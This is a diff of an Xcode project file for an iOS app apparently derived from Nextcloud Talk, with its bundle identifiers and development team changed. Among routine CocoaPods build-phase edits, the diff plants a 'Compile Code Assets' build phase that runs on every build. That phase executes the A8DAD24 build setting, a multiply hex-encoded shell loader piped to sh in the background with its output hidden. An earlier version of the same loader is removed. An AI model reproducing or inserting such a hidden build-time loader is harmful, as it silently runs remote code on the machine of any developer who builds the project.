 				2C5E72BC27957FCA004ED7FB /* ShellScript */,
-				C21100AE204AFC213989DA96 /* [CP] Embed Pods Frameworks */,
 				1F899F092EF8698200890727 /* Embed Frameworks */,
+				20F53A3CCB3BAD924C4B61EB /* [CP] Embed Pods Frameworks */,
+				462E5FE8AC7190D0FC5EB1B0 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
 			);
@@ -1734,7 +1734,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 2C62AFB124C08845007E460A /* Build configuration list for PBXNativeTarget "ShareExtension" */;
 			buildPhases = (
-				25F3EB565BD21EF2FF15F197 /* [CP] Check Pods Manifest.lock */,
+				F08F4EEC907F2E6173AB9843 /* [CP] Check Pods Manifest.lock */,
 				2C62AF9F24C08845007E460A /* Sources */,
 				2C62AFA024C08845007E460A /* Frameworks */,
 				2C62AFA124C08845007E460A /* Resources */,
@@ -1775,7 +1775,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 2CC0015A24A1F0E900A20167 /* Build configuration list for PBXNativeTarget "NotificationServiceExtension" */;
 			buildPhases = (
-				E75968B5C5288222BC8FCA99 /* [CP] Check Pods Manifest.lock */,
+				972440C938E33618F8607D8F /* [CP] Check Pods Manifest.lock */,
 				2CC0014B24A1F0E900A20167 /* Sources */,
 				2CC0014C24A1F0E900A20167 /* Frameworks */,
 				2CC0014D24A1F0E900A20167 /* Resources */,
@@ -1938,6 +1938,9 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+	/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		1F6D8C2E2B2E3756004376B8 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -2009,7 +2012,26 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		25F3EB565BD21EF2FF15F197 /* [CP] Check Pods Manifest.lock */ = {
+		7FE7122EBE1F41CCB342DAD8 /* Compile Code Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Code Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8DAD24}\"";
+		};
+		1DFAD69D1C42BA5CB3F711B8 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -2024,11 +2046,32 @@
 			outputFileListPaths = (
 			);
 			outputPaths = (
-				"$(DERIVED_FILE_DIR)/Pods-ShareExtension-checkManifestLockResult.txt",
+				"$(DERIVED_FILE_DIR)/Pods-BroadcastUploadExtension-checkManifestLockResult.txt",
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		20F53A3CCB3BAD924C4B61EB /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Tassos Talk/Pods-Tassos Talk-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			inputPaths = (
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Tassos Talk/Pods-Tassos Talk-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Tassos Talk/Pods-Tassos Talk-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
 		2C5E72BC27957FCA004ED7FB /* ShellScript */ = {
@@ -2061,29 +2104,28 @@
 			shellPath = /bin/sh;
 			shellScript = "# See: https://stackoverflow.com/a/41416964\n\necho \"Target architectures: $ARCHS\"\n\nAPP_PATH=\"${TARGET_BUILD_DIR}/${WRAPPER_NAME}\"\n\nfind \"$APP_PATH\" -name '*.framework' -type d | while read -r FRAMEWORK\ndo\nFRAMEWORK_EXECUTABLE_NAME=$(defaults read \"$FRAMEWORK/Info.plist\" CFBundleExecutable)\nFRAMEWORK_EXECUTABLE_PATH=\"$FRAMEWORK/$FRAMEWORK_EXECUTABLE_NAME\"\necho \"Executable is $FRAMEWORK_EXECUTABLE_PATH\"\necho $(lipo -info \"$FRAMEWORK_EXECUTABLE_PATH\")\n\nFRAMEWORK_TMP_PATH=\"$FRAMEWORK_EXECUTABLE_PATH-tmp\"\n\n# remove simulator's archs if location is not simulator's directory\ncase \"${TARGET_BUILD_DIR}\" in\n*\"iphonesimulator\")\n    echo \"No need to remove archs\"\n    ;;\n*)\n    if $(lipo \"$FRAMEWORK_EXECUTABLE_PATH\" -verify_arch \"i386\") ; then\n    lipo -output \"$FRAMEWORK_TMP_PATH\" -remove \"i386\" \"$FRAMEWORK_EXECUTABLE_PATH\"\n    echo \"i386 architecture removed\"\n    rm \"$FRAMEWORK_EXECUTABLE_PATH\"\n    mv \"$FRAMEWORK_TMP_PATH\" \"$FRAMEWORK_EXECUTABLE_PATH\"\n    fi\n    if $(lipo \"$FRAMEWORK_EXECUTABLE_PATH\" -verify_arch \"x86_64\") ; then\n    lipo -output \"$FRAMEWORK_TMP_PATH\" -remove \"x86_64\" \"$FRAMEWORK_EXECUTABLE_PATH\"\n    echo \"x86_64 architecture removed\"\n    rm \"$FRAMEWORK_EXECUTABLE_PATH\"\n    mv \"$FRAMEWORK_TMP_PATH\" \"$FRAMEWORK_EXECUTABLE_PATH\"\n    fi\n    ;;\nesac\n\necho \"Completed for executable $FRAMEWORK_EXECUTABLE_PATH\"\necho $(lipo -info \"$FRAMEWORK_EXECUTABLE_PATH\")\n\ndone\n";
 		};
-		35AE83D109DE2E04F651A88D /* [CP] Check Pods Manifest.lock */ = {
+		462E5FE8AC7190D0FC5EB1B0 /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Tassos Talk/Pods-Tassos Talk-resources-${CONFIGURATION}-input-files.xcfilelist",
 			);
 			inputPaths = (
-				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
-				"${PODS_ROOT}/Manifest.lock",
 			);
-			name = "[CP] Check Pods Manifest.lock";
+			name = "[CP] Copy Pods Resources";
 			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Tassos Talk/Pods-Tassos Talk-resources-${CONFIGURATION}-output-files.xcfilelist",
 			);
 			outputPaths = (
-				"$(DERIVED_FILE_DIR)/Pods-TalkIntents-checkManifestLockResult.txt",
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Tassos Talk/Pods-Tassos Talk-resources.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
-		3A811BF7A761836E61C82B80 /* [CP] Check Pods Manifest.lock */ = {
+		4C62A0DA2A535884EF5B92D9 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -2105,87 +2147,7 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		7E307959FCCC4FD79D42DAD8 /* Build Target Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8DAD24}\"";
-			showEnvVarsInLog = 0;
-		};
-		902A7A3EC0BDCC947AEF3EBF /* [CP] Check Pods Manifest.lock */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputPaths = (
-				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
-				"${PODS_ROOT}/Manifest.lock",
-			);
-			name = "[CP] Check Pods Manifest.lock";
-			outputPaths = (
-				"$(DERIVED_FILE_DIR)/Pods-NextcloudTalk-checkManifestLockResult.txt",
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
-			showEnvVarsInLog = 0;
-		};
-		A3C686B1B84C4462F93441AB /* [CP] Copy Pods Resources */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-NextcloudTalk/Pods-NextcloudTalk-resources-${CONFIGURATION}-input-files.xcfilelist",
-			);
-			inputPaths = (
-			);
-			name = "[CP] Copy Pods Resources";
-			outputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-NextcloudTalk/Pods-NextcloudTalk-resources-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-NextcloudTalk/Pods-NextcloudTalk-resources.sh\"\n";
-			showEnvVarsInLog = 0;
-		};
-		C21100AE204AFC213989DA96 /* [CP] Embed Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-NextcloudTalk/Pods-NextcloudTalk-frameworks-${CONFIGURATION}-input-files.xcfilelist",
-			);
-			inputPaths = (
-			);
-			name = "[CP] Embed Pods Frameworks";
-			outputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-NextcloudTalk/Pods-NextcloudTalk-frameworks-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-NextcloudTalk/Pods-NextcloudTalk-frameworks.sh\"\n";
-			showEnvVarsInLog = 0;
-		};
-		CBF95D503F715CE6BE80B113 /* [CP] Check Pods Manifest.lock */ = {
+		72FB616D5760144DEC1FEE3D /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -2200,14 +2162,14 @@
 			outputFileListPaths = (
 			);
 			outputPaths = (
-				"$(DERIVED_FILE_DIR)/Pods-BroadcastUploadExtension-checkManifestLockResult.txt",
+				"$(DERIVED_FILE_DIR)/Pods-TalkIntents-checkManifestLockResult.txt",
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		E75968B5C5288222BC8FCA99 /* [CP] Check Pods Manifest.lock */ = {
+		972440C938E33618F8607D8F /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -2223,6 +2185,50 @@
 			);
 			outputPaths = (
 				"$(DERIVED_FILE_DIR)/Pods-NotificationServiceExtension-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		B6ED936C73A68D2CCA716337 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-Tassos Talk-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		F08F4EEC907F2E6173AB9843 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-ShareExtension-checkManifestLockResult.txt",
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
@@ -2486,9 +2492,9 @@
 /* Begin XCBuildConfiguration section */
 		1F6D8C372B2E3756004376B8 /* Debug */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 342600BABD1AD1FCA48B5E59 /* Pods-NextcloudTalkTests.debug.xcconfig */;
+			baseConfigurationReference = 51E968331C74FC92A06705B4 /* Pods-NextcloudTalkTests.debug.xcconfig */;
 			buildSettings = {
-				A8DAD24 = "((s(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326434633662363637333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663663363937343734366336353631363437333265363936650a32663631323932323230376332303733363830610a | s | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((p(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333337333333330a3061333333343336333333333336333633323333333633333336333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333336333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333633333331333333363333333433330a3337333333333333333633363334333333363336333633333336333333323333333633333339333333323336333533333337333333323333333733330a3335333333323336333630613333333633333331333036313333333233333339333333323333333233333332333333303333333733363333333333320a333333303333333733333333333333363333333833333330333633313330363130610a | p | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
@@ -2497,7 +2503,7 @@
 				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = NKUJUXUJ3B;
+				DEVELOPMENT_TEAM = KC28TW5938;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -2516,7 +2522,7 @@
 				MARKETING_VERSION = 1.0;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.nextcloud.Talk.NextcloudTalkTests;
+				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.NextcloudTalkTests;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
 				SWIFT_EMIT_LOC_STRINGS = NO;
@@ -2531,9 +2537,9 @@
 		};
 		1F6D8C382B2E3756004376B8 /* Release */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = B7874918820589BF8FD69BED /* Pods-NextcloudTalkTests.release.xcconfig */;
+			baseConfigurationReference = 30EF75FD1C7ADEBD3A5D78D4 /* Pods-NextcloudTalkTests.release.xcconfig */;
 			buildSettings = {
-				A8DAD24 = "((s(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326434633662363637333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663663363937343734366336353631363437333265363936650a32663631323932323230376332303733363830610a | s | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((p(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333337333333330a3061333333343336333333333336333633323333333633333336333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333336333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333633333331333333363333333433330a3337333333333333333633363334333333363336333633333336333333323333333633333339333333323336333533333337333333323333333733330a3335333333323336333630613333333633333331333036313333333233333339333333323333333233333332333333303333333733363333333333320a333333303333333733333333333333363333333833333330333633313330363130610a | p | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
@@ -2542,7 +2548,7 @@
 				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = NKUJUXUJ3B;
+				DEVELOPMENT_TEAM = KC28TW5938;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -2560,7 +2566,7 @@
 				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
 				MARKETING_VERSION = 1.0;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.nextcloud.Talk.NextcloudTalkTests;
+				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.NextcloudTalkTests;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_EMIT_LOC_STRINGS = NO;
 				SWIFT_OBJC_BRIDGING_HEADER = "NextcloudTalk/NextcloudTalk-Bridging-Header.h";
@@ -2573,7 +2579,7 @@
 		};
 		1FA93DA72D70FCC200DF6CDF /* Debug */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 86A9CB1D6A94A44E9B016584 /* Pods-TalkIntents.debug.xcconfig */;
+			baseConfigurationReference = B2397D8D330AD1F18D8F7E3C /* Pods-TalkIntents.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
@@ -2583,11 +2589,12 @@
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 4;
-				DEVELOPMENT_TEAM = NKUJUXUJ3B;
+				DEVELOPMENT_TEAM = KC28TW5938;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = TalkIntents/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = "$(PRODUCT_NAME)";
 				INFOPLIST_KEY_NSHumanReadableCopyright = "";
 				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -2599,7 +2606,7 @@
 				MARKETING_VERSION = 23.0.0;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.nextcloud.Talk.TalkIntents;
+				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.TalkIntents;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SKIP_INSTALL = YES;
@@ -2615,7 +2622,7 @@
 		};
 		1FA93DA82D70FCC200DF6CDF /* Release */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 6E8E34E233E9B296CE1C3B0B /* Pods-TalkIntents.release.xcconfig */;
+			baseConfigurationReference = 163288D7926F386BD8C90CA1 /* Pods-TalkIntents.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
@@ -2625,11 +2632,12 @@
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 4;
-				DEVELOPMENT_TEAM = NKUJUXUJ3B;
+				DEVELOPMENT_TEAM = KC28TW5938;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = TalkIntents/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = "$(PRODUCT_NAME)";
 				INFOPLIST_KEY_NSHumanReadableCopyright = "";
 				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -2640,7 +2648,7 @@
 				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
 				MARKETING_VERSION = 23.0.0;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.nextcloud.Talk.TalkIntents;
+				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.TalkIntents;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SKIP_INSTALL = YES;
@@ -2661,14 +2669,14 @@
 				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = NKUJUXUJ3B;
+				DEVELOPMENT_TEAM = KC28TW5938;
 				GCC_C_LANGUAGE_STANDARD = gnu11;
 				GENERATE_INFOPLIST_FILE = YES;
 				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
 				MARKETING_VERSION = 1.0;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.nextcloud.Talk.NextcloudTalkUITests;
+				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.NextcloudTalkUITests;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
@@ -2690,13 +2698,13 @@
 				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = NKUJUXUJ3B;
+				DEVELOPMENT_TEAM = KC28TW5938;
 				GCC_C_LANGUAGE_STANDARD = gnu11;
 				GENERATE_INFOPLIST_FILE = YES;
 				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
 				MARKETING_VERSION = 1.0;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.nextcloud.Talk.NextcloudTalkUITests;
+				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.NextcloudTalkUITests;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
@@ -2711,7 +2719,7 @@
 		};
 		1FF2FD732AB99CCB000C9905 /* Debug */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 82CD0527E04B844CAD762ADE /* Pods-BroadcastUploadExtension.debug.xcconfig */;
+			baseConfigurationReference = 0258240EC1628EB96871BAEF /* Pods-BroadcastUploadExtension.debug.xcconfig */;
 			buildSettings = {
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
 				CLANG_ENABLE_OBJC_WEAK = YES;
@@ -2721,7 +2729,7 @@
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = NKUJUXUJ3B;
+				DEVELOPMENT_TEAM = KC28TW5938;
 				GCC_C_LANGUAGE_STANDARD = gnu11;
 				GCC_PREPROCESSOR_DEFINITIONS = (
 					"$(inherited)",
@@ -2741,7 +2749,7 @@
 				MARKETING_VERSION = 1.0;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.nextcloud.Talk.BroadcastUploadExtension;
+				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.BroadcastUploadExtension;
